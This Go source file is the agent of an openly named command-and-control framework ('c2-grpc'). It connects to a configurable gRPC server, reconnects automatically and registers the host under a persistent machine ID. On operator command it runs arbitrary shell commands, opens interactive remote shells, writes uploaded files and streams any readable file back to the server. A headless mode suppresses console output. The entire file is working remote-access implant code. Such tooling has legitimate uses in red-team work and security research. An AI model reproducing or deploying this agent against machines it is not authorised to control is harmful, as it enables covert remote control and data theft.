package main

import (
	"bufio"
	"context"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	pb "github.com/ardhptr21/c2-grpc/pb"
	"github.com/creack/pty"
	"github.com/google/uuid"
	"google.golang.org/grpc"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/status"
)

var (
	sessionMu    sync.RWMutex
	agentID      string
	agentClient  pb.AgentServiceClient
	outputClient pb.OutputServiceClient
	startTime    = time.Now()
	headlessMode bool
)

type shellSession struct {
	cmd    *exec.Cmd
	ptmx   *os.File
	stdin  io.WriteCloser
	stdout io.ReadCloser
}

type uploadTarget struct {
	file *os.File
	path string
}

var errAgentAlreadyRegistered = errors.New("agent already registered")

func main() {
	host := flag.String("host", "localhost", "gRPC server host")
	port := flag.Int("port", 50051, "gRPC server port")
	serverAddr := flag.String("server", "", "deprecated: gRPC server address")
	logFile := flag.String("log-file", "", "optional log file path")
	flag.BoolVar(&headlessMode, "headless", false, "run without interactive stdout output")
	flag.Parse()

	targetAddr := net.JoinHostPort(*host, strconv.Itoa(*port))
	if strings.TrimSpace(*serverAddr) != "" {
		targetAddr = *serverAddr
	}

	configureLogging(*logFile)

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	hostname, err := os.Hostname()
	if err != nil {
		log.Fatalf("hostname error: %v", err)
	}
	machineID, err := ensureMachineID()
	if err != nil {
		log.Fatalf("machine id error: %v", err)
	}

	for {
		if ctx.Err() != nil {
			return
		}

		err := runAgentSession(ctx, targetAddr, hostname, machineID)
		if ctx.Err() != nil {
			return
		}
		if errors.Is(err, errAgentAlreadyRegistered) {
			agentLog("[agent] %v", err)
			return
		}
		if err != nil {
			agentLog("[agent] %v", err)
		}

		agentLog("[agent] reconnecting to %s in 3s", targetAddr)
		select {
		case <-ctx.Done():
			return
		case <-time.After(3 * time.Second):
		}
	}
}

func runAgentSession(ctx context.Context, serverAddr, hostname, machineID string) error {
	dialCtx, cancelDial := context.WithTimeout(ctx, 5*time.Second)
	defer cancelDial()

	conn, err := grpc.DialContext(
		dialCtx,
		serverAddr,
		grpc.WithTransportCredentials(insecure.NewCredentials()),
		grpc.WithBlock(),
	)
	if err != nil {
		return fmt.Errorf("connect error: %w", err)
	}
	defer conn.Close()

	agentServiceClient := pb.NewAgentServiceClient(conn)
	heartbeatClient := pb.NewHeartbeatServiceClient(conn)
	taskClient := pb.NewTaskServiceClient(conn)
	outputServiceClient := pb.NewOutputServiceClient(conn)
	shellClient := pb.NewShellServiceClient(conn)
	fileClient := pb.NewFileServiceClient(conn)

	registerCtx, cancelRegister := context.WithTimeout(ctx, 5*time.Second)
	defer cancelRegister()

	reg, err := agentServiceClient.Register(registerCtx, &pb.RegisterRequest{
		Hostname:  hostname,
		Os:        runtime.GOOS,
		Ip:        "127.0.0.1",
		MachineId: machineID,
	})
	if err != nil {
		if status.Code(err) == codes.AlreadyExists {
			return fmt.Errorf("%w: machine %q is already connected", errAgentAlreadyRegistered, machineID)
		}
		return fmt.Errorf("register error for host %q: %w", hostname, err)
	}

	sessionMu.Lock()
	agentID = reg.GetAgentId()
	agentClient = agentServiceClient
	outputClient = outputServiceClient
	sessionMu.Unlock()

	agentLog("[agent] %s", reg.GetMessage())
	defer clearSession()

	sessionCtx, cancelSession := context.WithCancelCause(ctx)
	defer cancelSession(nil)
	defer func() {
		if errors.Is(context.Cause(sessionCtx), context.Canceled) {
			unregisterCurrentAgent()
		}
	}()

	go startHeartbeat(sessionCtx, cancelSession, heartbeatClient, reg.GetAgentId())
	go startTaskListener(sessionCtx, cancelSession, taskClient, reg.GetAgentId())
	go startShellBridge(sessionCtx, cancelSession, shellClient, reg.GetAgentId())
	go startFileBridge(sessionCtx, cancelSession, fileClient, reg.GetAgentId())

	<-sessionCtx.Done()
	cause := context.Cause(sessionCtx)
	if cause == nil || errors.Is(cause, context.Canceled) {
		return nil
	}
	return cause
}

func startHeartbeat(ctx context.Context, cancel context.CancelCauseFunc, client pb.HeartbeatServiceClient, agentID string) {
	stream, err := client.SendHeartbeat(ctx)
	if err != nil {
		cancel(fmt.Errorf("server connection lost: heartbeat stream error: %w", err))
		return
	}

	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			summary, err := stream.CloseAndRecv()
			if err != nil {
				if context.Cause(ctx) == nil {
					cancel(fmt.Errorf("server connection lost: heartbeat close error: %w", err))
				}
				return
			}
			agentLog("[agent] Heartbeat summary: received=%d last_status=%s", summary.GetTotalReceived(), summary.GetLastStatus())
			return
		case <-ticker.C:
			if err := stream.Send(&pb.HeartbeatRequest{
				AgentId:   agentID,
				Status:    "alive",
				Timestamp: time.Now().UnixMilli(),
			}); err != nil {
				cancel(fmt.Errorf("server connection lost: heartbeat send error: %w", err))
				return
			}
		}
	}
}

func startTaskListener(ctx context.Context, cancel context.CancelCauseFunc, client pb.TaskServiceClient, agentID string) {
	stream, err := client.ReceiveTasks(ctx, &pb.TaskRequest{AgentId: agentID})
	if err != nil {
		cancel(fmt.Errorf("server connection lost: task stream error: %w", err))
		return
	}

	for {
		task, err := stream.Recv()
		if err == io.EOF || ctx.Err() != nil {
			return
		}
		if err != nil {
			cancel(fmt.Errorf("server connection lost: task receive error: %w", err))
			return
		}
		go executeTask(task)
	}
}

func startShellBridge(ctx context.Context, cancel context.CancelCauseFunc, client pb.ShellServiceClient, agentID string) {
	stream, err := client.AgentShell(ctx)
	if err != nil {
		cancel(fmt.Errorf("server connection lost: shell stream error: %w", err))
		return
	}

	sendMu := &sync.Mutex{}
	sendEvent := func(event *pb.AgentShellEvent) error {
		sendMu.Lock()
		defer sendMu.Unlock()
		return stream.Send(event)
	}

	if err := sendEvent(&pb.AgentShellEvent{
		Type:    "register",
		AgentId: agentID,
	}); err != nil {
		cancel(fmt.Errorf("server connection lost: shell register error: %w", err))
		return
	}

	sessions := make(map[string]*shellSession)
	var sessionsMu sync.Mutex

	closeSession := func(sessionID, message string) {
		sessionsMu.Lock()
		session, ok := sessions[sessionID]
		if ok {
			delete(sessions, sessionID)
		}
		sessionsMu.Unlock()
		if !ok {
			return
		}

		if session.ptmx != nil {
			_ = session.ptmx.Close()
		}
		if session.stdin != nil {
			_ = session.stdin.Close()
		}
		if session.stdout != nil {
			_ = session.stdout.Close()
		}
		if session.cmd.Process != nil {
			_ = session.cmd.Process.Kill()
		}
		_ = sendEvent(&pb.AgentShellEvent{
			Type:      "closed",
			SessionId: sessionID,
			AgentId:   agentID,
			Message:   message,
		})
	}

	defer func() {
		sessionsMu.Lock()
		ids := make([]string, 0, len(sessions))
		for sessionID := range sessions {
			ids = append(ids, sessionID)
		}
		sessionsMu.Unlock()
		for _, sessionID := range ids {
			closeSession(sessionID, "shell bridge closed")
		}
	}()

	for {
		req, err := stream.Recv()
		if err == io.EOF || ctx.Err() != nil {
			return
		}
		if err != nil {
			cancel(fmt.Errorf("server connection lost: shell recv error: %w", err))
			return
		}

		switch req.GetType() {
		case "open":
			shellCmd := exec.Command(defaultShell())
			session, err := openShellSession(shellCmd, req.GetCols(), req.GetRows())
			if err != nil {
				_ = sendEvent(&pb.AgentShellEvent{
					Type:      "open_error",
					SessionId: req.GetSessionId(),
					AgentId:   agentID,
					Message:   err.Error(),
				})
				continue
			}
			sessionsMu.Lock()
			sessions[req.GetSessionId()] = session
			sessionsMu.Unlock()

			_ = sendEvent(&pb.AgentShellEvent{
				Type:      "open_ok",
				SessionId: req.GetSessionId(),
				AgentId:   agentID,
			})

			go func(sessionID string, session *shellSession) {
				defer closeSession(sessionID, "shell closed")

				buf := make([]byte, 1024)
				reader := shellSessionReader(session)
				for {
					n, err := reader.Read(buf)
					if n > 0 {
						if sendErr := sendEvent(&pb.AgentShellEvent{
							Type:      "output",
							SessionId: sessionID,
							AgentId:   agentID,
							Data:      string(buf[:n]),
						}); sendErr != nil {
							return
						}
					}
					if err != nil {
						if err == io.EOF || errors.Is(err, syscall.EIO) {
							break
						}
						_ = sendEvent(&pb.AgentShellEvent{
							Type:      "output",
							SessionId: sessionID,
							AgentId:   agentID,
							Data:      fmt.Sprintf("\nShell read error: %v\n", err),
						})
						break
					}
				}

				_ = session.cmd.Wait()
			}(req.GetSessionId(), session)
		case "input":
			sessionsMu.Lock()
			session, ok := sessions[req.GetSessionId()]
			sessionsMu.Unlock()
			if ok {
				inputData := req.GetData()
				if runtime.GOOS == "windows" && session.ptmx == nil {
					inputData = normalizeWindowsShellInput(inputData)
				}
				_, _ = shellSessionWriter(session).Write([]byte(inputData))
			}
		case "resize":
			sessionsMu.Lock()
			session, ok := sessions[req.GetSessionId()]
			sessionsMu.Unlock()
			if ok && session.ptmx != nil {
				_ = pty.Setsize(session.ptmx, &pty.Winsize{
					Cols: uint16(maxInt32(req.GetCols(), 80)),
					Rows: uint16(maxInt32(req.GetRows(), 24)),
				})
			}
		case "close":
			closeSession(req.GetSessionId(), "shell closed by operator")
		}
	}
}

func startFileBridge(ctx context.Context, cancel context.CancelCauseFunc, client pb.FileServiceClient, agentID string) {
	stream, err := client.AgentTransfer(ctx)
	if err != nil {
		cancel(fmt.Errorf("server connection lost: file stream error: %w", err))
		return
	}

	sendMu := &sync.Mutex{}
	sendEvent := func(event *pb.AgentFileEvent) error {
		sendMu.Lock()
		defer sendMu.Unlock()
		return stream.Send(event)
	}

	if err := sendEvent(&pb.AgentFileEvent{
		Type:    "register",
		AgentId: agentID,
	}); err != nil {
		cancel(fmt.Errorf("server connection lost: file register error: %w", err))
		return
	}

	uploads := make(map[string]*uploadTarget)
	var uploadsMu sync.Mutex

	closeUpload := func(transferID string) {
		uploadsMu.Lock()
		target := uploads[transferID]
		delete(uploads, transferID)
		uploadsMu.Unlock()
		if target != nil && target.file != nil {
			_ = target.file.Close()
		}
	}

	defer func() {
		uploadsMu.Lock()
		ids := make([]string, 0, len(uploads))
		for transferID := range uploads {
			ids = append(ids, transferID)
		}
		uploadsMu.Unlock()
		for _, transferID := range ids {
			closeUpload(transferID)
		}
	}()

	for {
		req, err := stream.Recv()
		if err == io.EOF || ctx.Err() != nil {
			return
		}
		if err != nil {
			cancel(fmt.Errorf("server connection lost: file recv error: %w", err))
			return
		}

		switch req.GetType() {
		case "upload_start":
			if req.GetTransferId() == "" || req.GetPath() == "" {
				_ = sendEvent(&pb.AgentFileEvent{
					Type:       "error",
					TransferId: req.GetTransferId(),
					AgentId:    agentID,
					Path:       req.GetPath(),
					Message:    "transfer_id and path are required",
				})
				continue
			}
			targetPath, err := resolveUploadTargetPath(req.GetPath(), req.GetMessage())
			if err != nil {
				_ = sendEvent(&pb.AgentFileEvent{
					Type:       "error",
					TransferId: req.GetTransferId(),
					AgentId:    agentID,
					Path:       req.GetPath(),
					Message:    err.Error(),
				})
				continue
			}
			if err := os.MkdirAll(filepath.Dir(targetPath), 0o755); err != nil {
				_ = sendEvent(&pb.AgentFileEvent{
					Type:       "error",
					TransferId: req.GetTransferId(),
					AgentId:    agentID,
					Path:       targetPath,
					Message:    err.Error(),
				})
				continue
			}
			f, err := os.Create(targetPath)
			if err != nil {
				_ = sendEvent(&pb.AgentFileEvent{
					Type:       "error",
					TransferId: req.GetTransferId(),
					AgentId:    agentID,
					Path:       targetPath,
					Message:    err.Error(),
				})
				continue
			}
			uploadsMu.Lock()
			uploads[req.GetTransferId()] = &uploadTarget{file: f, path: targetPath}
			uploadsMu.Unlock()
		case "upload_chunk":
			uploadsMu.Lock()
			target := uploads[req.GetTransferId()]
			uploadsMu.Unlock()
			if target == nil || target.file == nil {
				_ = sendEvent(&pb.AgentFileEvent{
					Type:       "error",
					TransferId: req.GetTransferId(),
					AgentId:    agentID,
					Path:       req.GetPath(),
					Message:    "upload not initialized",
				})
				continue
			}
			if _, err := target.file.Write(req.GetData()); err != nil {
				closeUpload(req.GetTransferId())
				_ = sendEvent(&pb.AgentFileEvent{
					Type:       "error",
					TransferId: req.GetTransferId(),
					AgentId:    agentID,
					Path:       target.path,
					Message:    err.Error(),
				})
			}
		case "upload_end":
			uploadsMu.Lock()
			target := uploads[req.GetTransferId()]
			uploadsMu.Unlock()
			closeUpload(req.GetTransferId())
			finalPath := req.GetPath()
			if target != nil {
				finalPath = target.path
			}
			_ = sendEvent(&pb.AgentFileEvent{
				Type:       "upload_done",
				TransferId: req.GetTransferId(),
				AgentId:    agentID,
				Path:       finalPath,
				Message:    "upload completed",
			})
		case "download":
			go func(req *pb.OperatorFileRequest) {
				f, err := os.Open(req.GetPath())
				if err != nil {
					_ = sendEvent(&pb.AgentFileEvent{
						Type:       "error",
						TransferId: req.GetTransferId(),
						AgentId:    agentID,
						Path:       req.GetPath(),
						Message:    err.Error(),
					})
					return
				}
				defer f.Close()

				buf := make([]byte, 32*1024)
				for {
					n, err := f.Read(buf)
					if n > 0 {
						if sendErr := sendEvent(&pb.AgentFileEvent{
							Type:       "download_chunk",
							TransferId: req.GetTransferId(),
							AgentId:    agentID,
							Path:       req.GetPath(),
							Data:       append([]byte(nil), buf[:n]...),
						}); sendErr != nil {
							return
						}
					}
					if err == io.EOF {
						break
					}
					if err != nil {
						_ = sendEvent(&pb.AgentFileEvent{
							Type:       "error",
							TransferId: req.GetTransferId(),
							AgentId:    agentID,
							Path:       req.GetPath(),
							Message:    err.Error(),
						})
						return
					}
				}

				_ = sendEvent(&pb.AgentFileEvent{
					Type:       "download_done",
					TransferId: req.GetTransferId(),
					AgentId:    agentID,
					Path:       req.GetPath(),
					Message:    "download completed",
				})
			}(req)
		case "list":
			go func(req *pb.OperatorFileRequest) {
				listPath := strings.TrimSpace(req.GetPath())
				if listPath == "" {
					listPath = "."
				}

				entries, err := os.ReadDir(listPath)
				if err != nil {
					_ = sendEvent(&pb.AgentFileEvent{
						Type:       "error",
						TransferId: req.GetTransferId(),
						AgentId:    agentID,
						Path:       listPath,
						Message:    err.Error(),
					})
					return
				}

				for _, entry := range entries {
					info, err := entry.Info()
					if err != nil {
						continue
					}
					fullPath := filepath.Join(listPath, entry.Name())
					if sendErr := sendEvent(&pb.AgentFileEvent{
						Type:       "list_entry",
						TransferId: req.GetTransferId(),
						AgentId:    agentID,
						Path:       fullPath,
						Message:    entry.Name(),
						IsDir:      entry.IsDir(),
						Size:       info.Size(),
						ModifiedAt: info.ModTime().UnixMilli(),
					}); sendErr != nil {
						return
					}
				}

				_ = sendEvent(&pb.AgentFileEvent{
					Type:       "list_done",
					TransferId: req.GetTransferId(),
					AgentId:    agentID,
					Path:       listPath,
					Message:    "directory listed",
				})
			}(req)
		case "cancel":
			closeUpload(req.GetTransferId())
		}
	}
}

func executeTask(task *pb.Task) {
	command := task.GetCommand()
	args := task.GetArgs()
	agentID, _, outputClient := currentSession()

	stream, err := outputClient.SendOutput(context.Background())
	if err != nil {
		log.Printf("[agent] output stream error: %v", err)
		return
	}

	sendChunk := func(chunk string) {
		if err := stream.Send(&pb.OutputChunk{
			TaskId:  task.GetTaskId(),
			AgentId: agentID,
			Line:    chunk,
		}); err != nil {
			log.Printf("[agent] output send error: %v", err)
		}
	}

	// Emit an initial chunk so zero-output commands still produce a task record.
	sendChunk("")

	// Check built-ins
	switch command {
	case "sysinfo":
		var mem runtime.MemStats
		runtime.ReadMemStats(&mem)
		info := []string{
			fmt.Sprintf("Hostname: %s", hostnameOrUnknown()),
			fmt.Sprintf("Platform: %s", runtime.GOOS),
			fmt.Sprintf("Arch: %s", runtime.GOARCH),
			fmt.Sprintf("CPUs: %d", runtime.NumCPU()),
			fmt.Sprintf("RAM total: %d MB", bToMB(mem.Sys)),
			fmt.Sprintf("RAM free: %d MB", bToMB(mem.Frees)),
			fmt.Sprintf("Uptime: %s", time.Since(startTime).Truncate(time.Second)),
		}
		for _, line := range info {
			sendChunk(line + "\n")
		}
	case "kill":
		sendChunk("Shutting down agent. Goodbye.\n")
		if _, err := stream.CloseAndRecv(); err != nil {
			log.Printf("[agent] output close error: %v", err)
		}
		unregisterCurrentAgent()
		os.Exit(0)
	default:
		// Execute real command
		fullCommand := command
		if args != "" {
			fullCommand += " " + args
		}

		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("cmd", "/C", fullCommand)
		} else {
			cmd = exec.Command("sh", "-c", fullCommand)
		}

		if runtime.GOOS == "windows" {
			runWithPipe(cmd, sendChunk)
		} else {
			runWithPTY(cmd, sendChunk)
		}
	}

	if _, err := stream.CloseAndRecv(); err != nil {
		log.Printf("[agent] output close error: %v", err)
	}
}

func currentSession() (string, pb.AgentServiceClient, pb.OutputServiceClient) {
	sessionMu.RLock()
	defer sessionMu.RUnlock()
	return agentID, agentClient, outputClient
}

func clearSession() {
	sessionMu.Lock()
	defer sessionMu.Unlock()
	agentID = ""
	agentClient = nil
	outputClient = nil
}

func unregisterCurrentAgent() {
	agentID, agentClient, _ := currentSession()
	if agentID == "" || agentClient == nil {
		return
	}

	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()

	if _, err := agentClient.Unregister(ctx, &pb.UnregisterRequest{AgentId: agentID}); err != nil {
		log.Printf("[agent] unregister error: %v", err)
		return
	}

	clearSession()
}

func ensureMachineID() (string, error) {
	path, err := machineIDPath()
	if err != nil {
		return "", err
	}

	data, err := os.ReadFile(path)
	if err == nil {
		id := strings.TrimSpace(string(data))
		if id != "" {
			return id, nil
		}
	}
	if err != nil && !errors.Is(err, os.ErrNotExist) {
		return "", err
	}

	id := uuid.NewString()
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		return "", err
	}
	if err := os.WriteFile(path, []byte(id+"\n"), 0o600); err != nil {
		return "", err
	}
	return id, nil
}

func machineIDPath() (string, error) {
	configDir, err := os.UserConfigDir()
	if err == nil && configDir != "" {
		return filepath.Join(configDir, "c2-grpc", "agent-id"), nil
	}

	homeDir, err := os.UserHomeDir()
	if err != nil {
		return "", err
	}
	return filepath.Join(homeDir, ".c2-grpc-agent-id"), nil
}

func resolveUploadTargetPath(targetPath, sourceName string) (string, error) {
	targetPath = strings.TrimSpace(targetPath)
	if targetPath == "" {
		return "", fmt.Errorf("target path is required")
	}

	info, err := os.Stat(targetPath)
	if err == nil && info.IsDir() {
		name := filepath.Base(strings.TrimSpace(sourceName))
		if name == "." || name == string(filepath.Separator) || name == "" {
			return "", fmt.Errorf("source filename is required for directory upload")
		}
		return filepath.Join(targetPath, name), nil
	}
	if err != nil && !errors.Is(err, os.ErrNotExist) {
		return "", err
	}
	if strings.HasSuffix(targetPath, string(filepath.Separator)) {
		name := filepath.Base(strings.TrimSpace(sourceName))
		if name == "." || name == string(filepath.Separator) || name == "" {
			return "", fmt.Errorf("source filename is required for directory upload")
		}
		return filepath.Join(targetPath, name), nil
	}
	return targetPath, nil
}

func openShellSession(cmd *exec.Cmd, cols, rows int32) (*shellSession, error) {
	if runtime.GOOS == "windows" {
		stdout, err := cmd.StdoutPipe()
		if err != nil {
			return nil, err
		}
		cmd.Stderr = cmd.Stdout
		stdin, err := cmd.StdinPipe()
		if err != nil {
			return nil, err
		}
		if err := cmd.Start(); err != nil {
			_ = stdin.Close()
			_ = stdout.Close()
			return nil, err
		}
		return &shellSession{
			cmd:    cmd,
			stdin:  stdin,
			stdout: stdout,
		}, nil
	}

	size := &pty.Winsize{
		Cols: uint16(maxInt32(cols, 80)),
		Rows: uint16(maxInt32(rows, 24)),
	}
	ptmx, err := pty.StartWithSize(cmd, size)
	if err != nil {
		return nil, err
	}
	return &shellSession{cmd: cmd, ptmx: ptmx}, nil
}

func shellSessionReader(session *shellSession) io.Reader {
	if session.ptmx != nil {
		return session.ptmx
	}
	return session.stdout
}

func shellSessionWriter(session *shellSession) io.Writer {
	if session.ptmx != nil {
		return session.ptmx
	}
	return session.stdin
}

func normalizeWindowsShellInput(s string) string {
	s = strings.ReplaceAll(s, "\r\n", "\n")
	s = strings.ReplaceAll(s, "\r", "\n")
	s = strings.ReplaceAll(s, "\n", "\r\n")
	return s
}

func defaultShell() string {
	if runtime.GOOS == "windows" {
		return "cmd.exe"
	}
	if runtime.GOOS == "linux" {
		if _, err := exec.LookPath("sh"); err == nil {
			return "sh"
		}
		if _, err := exec.LookPath("bash"); err == nil {
			return "bash"
		}
	}
	if shell := os.Getenv("SHELL"); shell != "" {
		return shell
	}
	return "sh"
}

func maxInt32(v, fallback int32) int32 {
	if v <= 0 {
		return fallback
	}
	return v
}

func runWithPipe(cmd *exec.Cmd, sendChunk func(string)) {
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		sendChunk(fmt.Sprintf("Error creating stdout pipe: %v\n", err))
		return
	}

	cmd.Stderr = cmd.Stdout
	if err := cmd.Start(); err != nil {
		sendChunk(fmt.Sprintf("Error starting command: %v\n", err))
		return
	}

	scanner := bufio.NewScanner(stdout)
	for scanner.Scan() {
		sendChunk(scanner.Text() + "\n")
	}
	if err := scanner.Err(); err != nil {
		sendChunk(fmt.Sprintf("Error reading command output: %v\n", err))
	}
	if err := cmd.Wait(); err != nil {
		sendChunk(fmt.Sprintf("Command exited with error: %v\n", err))
	}
}

func runWithPTY(cmd *exec.Cmd, sendChunk func(string)) {
	if cmd.Env == nil {
		cmd.Env = os.Environ()
	}
	cmd.Env = append(cmd.Env, "TERM=xterm-256color")

	ptmx, err := pty.Start(cmd)
	if err != nil {
		sendChunk(fmt.Sprintf("Error starting command: %v\n", err))
		return
	}
	defer func() { _ = ptmx.Close() }()

	buf := make([]byte, 1024)
	for {
		n, err := ptmx.Read(buf)
		if n > 0 {
			sendChunk(string(buf[:n]))
		}
		if err != nil {
			if err == io.EOF || errors.Is(err, syscall.EIO) {
				break
			}
			sendChunk(fmt.Sprintf("\nError reading command output: %v\n", err))
			break
		}
	}

	if err := cmd.Wait(); err != nil {
		sendChunk(fmt.Sprintf("\nCommand exited with error: %v\n", err))
	}
}

func hostnameOrUnknown() string {
	hostname, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return hostname
}

func bToMB(v uint64) uint64 {
	return v / 1024 / 1024
}

func configureLogging(logFile string) {
	if logFile == "" {
		return
	}

	f, err := os.OpenFile(logFile, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o644)
	if err != nil {
		log.Fatalf("open log file: %v", err)
	}
	log.SetOutput(f)
}

func agentLog(format string, args ...any) {
	if headlessMode {
		log.Printf(format, args...)
		return
	}
	fmt.Printf(format+"\n", args...)
}
